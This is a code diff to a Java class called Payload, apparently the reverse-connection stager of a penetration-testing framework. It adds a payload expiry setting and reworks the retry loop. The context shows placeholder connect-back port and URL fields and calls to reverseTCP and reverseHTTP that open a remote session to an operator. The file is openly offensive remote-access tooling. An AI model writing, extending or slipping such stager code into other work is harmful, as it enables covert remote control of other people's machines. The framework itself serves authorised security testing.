@@ -24,6 +24,7 @@ public class Payload {
     public static final String LPORT =          "YYYY4444                            ";
     public static final String RETRY_TOTAL =    "TTTT                                ";
     public static final String RETRY_WAIT =     "SSSS                                ";
+    public static final String PAYLOAD_EXPIRY = "UUUU0                               ";
 
     public static long retry_total;
     public static long retry_wait;
@@ -57,18 +58,26 @@ public class Payload {
         }
         int retryTotal;
         int retryWait;
+        long payloadExpiry;
         try {
             retryTotal = Integer.parseInt(RETRY_TOTAL.substring(4).trim());
             retryWait = Integer.parseInt(RETRY_WAIT.substring(4).trim());
+            payloadExpiry = TimeUnit.SECONDS.toMillis(Long.parseLong(PAYLOAD_EXPIRY.substring(4).trim()));
         } catch (NumberFormatException e) {
             return;
         }
 
         long payloadStart = System.currentTimeMillis();
+
         retry_total = TimeUnit.SECONDS.toMillis(retryTotal);
         retry_wait = TimeUnit.SECONDS.toMillis(retryWait);
 
-        while (System.currentTimeMillis() < payloadStart + retry_total) {
+        do {
+            if (payloadExpiry > 0 && System.currentTimeMillis() > payloadExpiry) {
+                // Payload expired
+                return;
+            }
+
             try {
                 if (URL.substring(4).trim().length() == 0) {
                     reverseTCP();
@@ -84,7 +93,7 @@ public class Payload {
             } catch (InterruptedException e) {
                 return;
             }
-        }
+        } while (System.currentTimeMillis() < payloadStart + retry_total);
     }
 
     private static void reverseHTTP() throws Exception {
